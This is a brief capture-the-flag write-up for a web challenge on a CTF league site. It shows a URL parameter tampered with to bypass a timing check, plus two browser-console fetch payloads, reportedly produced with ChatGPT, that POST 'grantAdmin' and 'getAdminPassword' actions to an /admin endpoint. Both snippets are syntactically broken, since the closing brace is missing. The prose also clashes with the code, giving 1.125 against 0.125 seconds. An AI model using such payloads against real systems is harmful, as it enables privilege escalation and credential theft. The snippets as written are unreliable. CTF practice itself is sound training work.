# Hash-Brown Solution

Date: October 6, 2025

### Steps

#### Flag 1

- Clicked on the Reserve Button
- Solved the Math Prompt and Got the Pop Up
- With the Given server.js, I Found This Line of Code
    - `if (time > 0.125) {`
    - So, the Math Problem Need to be Solved Under 1.125 Seconds
- Inspected the Site and Went to the Network Tab
- Header -> General -> Request URL
- Copied the Request URL and Pasted into a New Tab
- Edit the URL to: https://cheap-sites.ctf-league.damsec.org/reserve?time=0.1&room=101
    - time is set to 0.1
- Got the Key: `osu{fa5t3r_th4n_ai}`

#### Flag 2

- Got Flag 2 With Help of Using ChatGPT. Gave ChatGPT the Context of the CTF Activity and Code That Was Given

```
(async () => {
    const body = { action: 'grantAdmin', user: 'attacker', env: 'FLAG_3' };
    const r = await fetch('/admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    );
  console.log(await r.text());
})();
```

#### Flag 3

- Similarly With Flag 2, I Had Asked ChatGPT to Find Flag 3 For Me

```
(async () => {
    const body = { action: 'getAdminPassword', type: 'email' };
    const r = await fetch('/admin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    );
    console.log(await r.text());
})();
```